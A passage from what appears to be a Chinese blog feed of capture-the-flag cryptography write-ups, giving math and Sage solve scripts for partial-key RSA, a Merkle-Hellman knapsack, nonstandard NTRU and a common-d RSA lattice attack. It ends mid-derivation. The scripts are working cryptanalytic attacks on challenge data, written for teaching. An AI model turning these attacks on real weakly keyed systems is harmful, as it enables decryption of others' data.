class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">510</span>)</span><br><span class="line">q = getPrime(<span class="number">510</span>)</span><br><span class="line">r = getPrime(<span class="number">510</span>)</span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">m = bytes_to_long(os.urandom(<span class="number">30</span>) + flag)</span><br><span class="line">n = p * q * r</span><br><span class="line">d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>))</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(n // p)</span><br><span class="line">print(p)</span><br><span class="line">print(c)</span><br><span class="line">print(hex(d % (<span class="number">1</span> &lt;&lt; <span class="number">540</span>)))</span><br></pre></td></tr></table></figure><p>$k(p-1)\rightarrow k’,qr\rightarrow n’,q+r\rightarrow s$</p><p>$ed_{0}\equiv 1+k’(n’-s+1)\quad mod\ 2^{d_{0}.nbits()}\quad (1)$</p><p>$q^{2}-sq+n’\equiv 0\quad mod\ 2^{d_{0}.nbits()}\quad (2)$</p><p>$q\cdot (1),k’\cdot (2)$，联立可得，$(ed_{0}-1-k’n’-k’)q+k’q^{2}+k’n’\equiv 0\quad mod\ 2^{d_{0}.nbits()}$</p><p>即求解同余方程可得<strong>q的低size(d0)位</strong>，本来是个partial d的coppersmith问题，但因为step1求解同余方程后得到的q已是完整的q，所以无需后续的copper</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n, p)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e + <span class="number">1</span>):</span><br><span class="line">        k_dot = k * (p - <span class="number">1</span>)</span><br><span class="line">        results = solve_mod([e * d0 * X - k_dot * X * (n - X + <span class="number">1</span>) + k_dot * n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            q = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">n = ... <span class="comment"># q * r</span></span><br><span class="line">p = </span><br><span class="line">c = </span><br><span class="line">d0 = </span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">kbits = d0.nbits()</span><br><span class="line">q = find_p(d0, kbits, e, n, p)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (n // q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">print(bytes.fromhex(hex(pow(c, d, p * n))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'\xf3\xaa\x03~\xaesZ?\xb5\x84\x0b\t\xb7-\xd8\xa8\xca\x80\x18\xd4\x9eVm6\x8bU\xb6\xfb`\x8eflag&#123;6809781d08e120627e623dcdafe26b8a&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="AliceHomework"><a href="#AliceHomework" class="headerlink" title="AliceHomework"></a>AliceHomework</h3><h4 id="题解分析-2"><a href="#题解分析-2" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>Merkle-Hellman的背包系统，Shamir’s Attack没自己实现过- -照例作格基约化</p><p>303维的子集和问题，已知明文flag{…}可以降维到256维，规模还是略大（但是赛后得知到这一步以后直接LLL能出，啊这）</p><p>由于flag内芯是32位小写md5，而0~f的二进制编码均为$0x1xxxxx$格式，因此能继续降维至256-32*2=192维</p><p>最后常规BKZ即可</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pubkey = [...] <span class="comment"># len(pubkey) == 303</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">prefix = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(bytes_to_long(<span class="string">b'flag&#123;'</span>))[<span class="number">2</span>:]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(prefix)):</span><br><span class="line">    c -= prefix[i] * pubkey[i]</span><br><span class="line"></span><br><span class="line">suffix = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(ord(<span class="string">'&#125;'</span>))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)]</span><br><span class="line">n = len(pubkey)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    c -= pubkey[n - <span class="number">8</span> + i] * suffix[i]</span><br><span class="line">    </span><br><span class="line">elements = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(prefix), len(pubkey) - <span class="number">8</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="comment">#c -= 0 * pubkey[i]</span></span><br><span class="line">    elements.append(pubkey[i + <span class="number">1</span>])</span><br><span class="line">    c -= <span class="number">1</span> * pubkey[i + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">8</span>):</span><br><span class="line">        elements.append(pubkey[i + j])</span><br><span class="line">        </span><br><span class="line">n = len(elements)</span><br><span class="line">A = Matrix(ZZ, n + <span class="number">1</span>, n + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    A[i, <span class="number">0</span>] = elements[i]</span><br><span class="line">    A[i, i + <span class="number">1</span>] = <span class="number">2</span></span><br><span class="line">A[n, <span class="number">0</span>] = c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">    A[n, i] = <span class="number">1</span></span><br><span class="line">AL = A.BKZ()</span><br><span class="line">mid = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> AL:</span><br><span class="line">    <span class="keyword">if</span> all(line[i] == <span class="number">1</span> <span class="keyword">or</span> line[i] == <span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            line = -line</span><br><span class="line">        mid = line[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mid_str = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> mid:</span><br><span class="line">    <span class="keyword">if</span> _ == <span class="number">-1</span>:</span><br><span class="line">        mid_str += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mid_str += <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    flag += <span class="string">'0'</span></span><br><span class="line">    flag += mid_str[j]</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    flag += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        flag += mid_str[j]</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">print(long_to_bytes(int(flag, <span class="number">2</span>)))</span><br><span class="line"><span class="comment"># b'8130e8c14fe4df06558c0a7ebf06f272'</span></span><br></pre></td></tr></table></figure><h3 id="PolyCrypto"><a href="#PolyCrypto" class="headerlink" title="PolyCrypto"></a>PolyCrypto</h3><h4 id="题解分析-3"><a href="#题解分析-3" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>NTRU CryptoSystem，赛中来不及- -</p><p>非标准的NTRU，且私钥已给出，直接decrypt即可</p><p><strong>Enc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">I = Integers(q)</span><br><span class="line">R = PolynomialRing(I, <span class="string">"x"</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">S = R.quotient(x ^ N - <span class="number">1</span>, <span class="string">"x"</span>)</span><br><span class="line">F = S(randomseq(N)) <span class="comment"># 本题randomseq无标准NTRU中的参数d...就直接[randint(-1, 1) for _ in range(N)]...很迷</span></span><br><span class="line">f = p * F + <span class="number">1</span></span><br><span class="line">z = f ^ <span class="number">-1</span></span><br><span class="line">g = S(randomseq(N))</span><br><span class="line">h = p * z * g</span><br><span class="line"><span class="comment"># h =&gt; pubkey ; f =&gt; prikey</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(key, block ,S)</span>:</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="comment"># transform number to polynomial</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(N):</span><br><span class="line">        out.append(block % <span class="number">3</span> - <span class="number">1</span>)</span><br><span class="line">        block -= block % <span class="number">3</span></span><br><span class="line">        block //= <span class="number">3</span></span><br><span class="line">    cipher = S(randomseq(N)) * key + S(out) <span class="comment"># c = r * h + m</span></span><br><span class="line">    <span class="keyword">return</span> list(cipher)</span><br></pre></td></tr></table></figure><p>$c=r<em>h+m=r</em>p<em>z</em>g+m\quad (mod\ q)$</p><p>$a=f<em>c=r</em>p<em>g+f</em>m\quad (mod\ q)$</p><p>标准的NTRU解密基于该步骤的$rpg+fm$在Zmod(q)与在ZZ上等价，否则在$a*inv_f$后得到的结果非m</p><p>而本题randomseq是个自写的函数…汉明重量不能保证上界，且$F=randpoly,f=p*F+1$，因此标准decrypt失败，再次化简上式可知，</p><p>$a=f<em>c=r</em>p<em>g+p</em>m*F+m$，因此在Zmod(p)上即为m</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">61</span></span><br><span class="line">q = <span class="number">5039</span></span><br><span class="line">p = <span class="number">11</span></span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">'x'</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">'y'</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line">h = R([...])</span><br><span class="line">f = R([...])</span><br><span class="line">c = [[...], [...], ...]</span><br><span class="line">c = [R(_) <span class="keyword">for</span> _ <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balance_mod</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    g = list(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_prime</span><span class="params">(f, p)</span>:</span></span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coef2num</span><span class="params">(coefs)</span>:</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(coefs)):</span><br><span class="line">        num += coefs[i] * (<span class="number">3</span> ** i)</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c, f)</span>:</span></span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="comment"># m = balance_mod(a * invert_mod_prime(f, p), p)</span></span><br><span class="line">    m = balance_mod(a, p)</span><br><span class="line">    coefs = [_ + <span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> m]</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(coef2num(coefs))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b""</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> c:</span><br><span class="line">    flag += decrypt(_, f)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># b'59d34a385e1b59c977eea74e92e0d9dc'</span></span><br></pre></td></tr></table></figure><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>Fianl是内网综合渗透，队友带飞，舒适.jpg</p><p><img src= "/img/loading.gif" data-src="/2020/07/31/WriteUp-%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A12020%E5%A4%A9%E7%BF%BC%E6%9D%AF-Crypto/5c925fcbbe85298b.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(SCTF2020) - Crypto</title>
      <link href="/2020/07/06/WriteUp-SCTF2020-Crypto/"/>
      <url>/2020/07/06/WriteUp-SCTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p>虽说依旧是paper题- -但出题人基本没做隐藏or变换（coin考点crash，然后回来骂骂咧咧.jpg，笑死</p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><strong>Encode</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">flag = int(<span class="string">'SCTF&#123;*******************&#125;'</span>.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">d = getPrime(randint(<span class="number">380</span>, <span class="number">385</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    e = inverse(d, fn)</span><br><span class="line">    c = pow(flag, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'e'</span>+str(_)+str(<span class="string">'='</span>)+hex(e)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'n'</span>+str(_)+str(<span class="string">'='</span>)+hex(n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'c'</span>+str(_)+str(<span class="string">'='</span>)+hex(c)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">350</span></span><br></pre></td></tr></table></figure><p><strong>Attack on r ($e_{i},n_{i},c_{i}$)s with Common d($d&lt;N_{r}^{\delta}$)</strong></p><p><a href="https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf" target="_blank" rel="noopener">https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf</a></p><p>$N_{1}&lt;N_{2}&lt;…&lt;N_{r}&lt;2N_{1}$ with Common $d&lt;N_{r}^{\delta}$. And all each modulus is balanced so that $s=p+q-1&lt;\frac{3\sqrt{2}}{2}N_{r}^{1/2}&lt;3N^{1/2}.$ Then we have r equations: $e_{i}d-N_{i}k_{i}=1-k_{i}s_{i}$.</p><p>Let vector A = $[d,k_{1},k_{2}…,k_{r}]$, $M=ceil(N_{r}^{1/2})$, matrix B =</p><script type="math/tex; mode=display">\left[\begin{matrix}M & e_{1} & e_{2} & ... & e_{r}\\0 & -N_{1} & 0 & ... & 0\\0 & 0 & -N_{2} & ... & 0\\... & ... & ... & ... & ...\\0 & 0 & 0 & ... & -N_{r}\\\end{matrix}\right]</script><p>$C=AB=[dM,1-k_{1}s_{1},1-k_{2}s_{2},…,1-k_{r}s_{r}]$.</p><p>转求向量C满足Lattice(B)的Minkowski界的条件（满足即转化为SVP）：</p><p>$|C|&lt;N_{r}^{\frac{1}{2}+\delta}\sqrt{1+9r}$. </p><p>$\sqrt{r+1}det(B)^{\frac{1}{r+1}}&gt;\sqrt{r+1}N_{1}^{\frac{r+\frac{1}{2}}{r+1}}&gt;\sqrt{r+1}(\frac{N_{r}}{2})^{\frac{r+\frac{1}{2}}{r+1}}$.</p><p><strong>Then we wanna $N_{r}^{\frac{1}{2}+\delta}\sqrt{1+9r}&lt;\sqrt{r+1}(\frac{N_{r}}{2})^{\frac{r+\frac{1}{2}}{r+1}}\Leftrightarrow N_{r}^{\delta-\frac{r}{2r+2}}&lt;\frac{\sqrt{\frac{r+1}{9r+1}}}{2^{\frac{2r+1}{2r+2}}}$.</strong></p><p>Cuz $r\geq 1$, the right side $&gt;\frac{1}{6}$. So if</p><script type="math/tex; mode=display">\delta<\frac{r}{2r+2}-log_{N_{r}}(6)</script><p>the Minkowski satisfies.</p><p>作本题的简单估计，$bound\approx\frac{3}{8}-\frac{1}{400}&gt;\frac{380}{1024}$.</p><p>size(d) = 385时，从原理上有一定失败几率，但能很容易交互出size(d)满足Minkowski界的d. (e.g. size(d)=380)</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">e = [...]</span><br><span class="line">n = [...]</span><br><span class="line">c = [...]</span><br><span class="line">M = isqrt(max(n))</span><br><span class="line">A = Matrix(ZZ, len(e) + <span class="number">1</span>, len(e) + <span class="number">1</span>)</span><br><span class="line">A[<span class="number">0</span>] = [M] + e</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">    A[i + <span class="number">1</span>, i + <span class="number">1</span>] = -n[i]</span><br><span class="line">AL = A.BKZ()</span><br><span class="line">d = AL[<span class="number">0</span>, <span class="number">0</span>] // M</span><br><span class="line">print(bytes.fromhex(hex(pow(c[<span class="number">0</span>], d, n[<span class="number">0</span>]))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'SCTF&#123;673ff064da31c0d7aee56884b01a09&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h3><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>考察<strong>Attack on NTRU Cryptosystem</strong></p><p>NTRU - Nth Degree Truncated Polynomial Ring Units</p><p>$R=Z[x]/(x^{n}-1)$: <strong>quotient</strong></p><ul><li><p>$0^{th}$ step. Variable and Func prepared</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">d = </span><br><span class="line">q = </span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">'x'</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">'y'</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line"></span><br><span class="line"><span class="comment"># return an n-coef polynomial where exactly d coef are nonzero(±1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_poly</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(d &lt;= n)</span><br><span class="line">    result = n * [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(d):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = randrange(n)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> result[r]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        result[r] = <span class="number">1</span> - <span class="number">2</span> * randrange(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> R(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># balance coef between -q/2 and q/2 (mod q)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balance_mod</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    g = list(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># return h which f*h=p*u+1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_prime</span><span class="params">(f, p)</span>:</span></span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="comment"># return h which f*h=q*u+1 (q=2^m, m\in N*)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_powerof2</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(q.is_power_of(<span class="number">2</span>))</span><br><span class="line">    g = invert_mod_prime(f, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = balance_mod(f * g, q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = balance_mod(g * (<span class="number">2</span> - r), q)</span><br></pre></td></tr></table></figure></li><li><p>$1^{st}$ step. Key Generation</p><p>Select a prime p and genkey with the func below,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = random_poly()</span><br><span class="line">            fp = invert_mod_prime(f, p)</span><br><span class="line">            fq = invert_mod_powerof2(f, q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    g = random_poly()</span><br><span class="line">    pubkey = balance_mod(p * g * fq, q)</span><br><span class="line">    prikey = f, fp</span><br><span class="line">    <span class="keyword">return</span> pubkey, prikey</span><br></pre></td></tr></table></figure></li><li><p>$2^{nd}$ step. Encryption</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(m, pubkey)</span>:</span></span><br><span class="line">    r = random_poly()</span><br><span class="line">    <span class="keyword">return</span> balance_mod(pubkey * r + m, q)</span><br></pre></td></tr></table></figure></li><li><p>$3^{rd}$ step. Decryption</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(c, prikey)</span>:</span></span><br><span class="line">    f, fp = prikey</span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="keyword">return</span> balance_mod(a * fp, p)</span><br></pre></td></tr></table></figure><p>Explain why it works,</p><p>On Zmod(q), $c=h<em>r+m=p</em>g<em>fq</em>r+m$.</p><p>$a=c<em>f=p</em>g<em>(f</em>fq)<em>r+f</em>m=p<em>g</em>r+f*m$.</p><p>$a<em>fp=p</em>g<em>r</em>fp+(f<em>fp)</em>m$, <strong>and it equals to m on Zmod(p).</strong></p><p>当$p<em>g</em>r+f<em>m$在Zmod(q)上和ZZ上完全等价，或是说该多项式系数均落在$(-q/2,q/2)$时，解密可行性成立，个人做粗略参数估计后发现应满足$2d(p+1)&lt;q$（有paper上给出<em>*p(6d+1)&lt;q</em></em>，但证明暂时没时间看ojz）</p></li></ul><p>下再给出针对NTRU的攻击：</p><p>On Zmod(q), 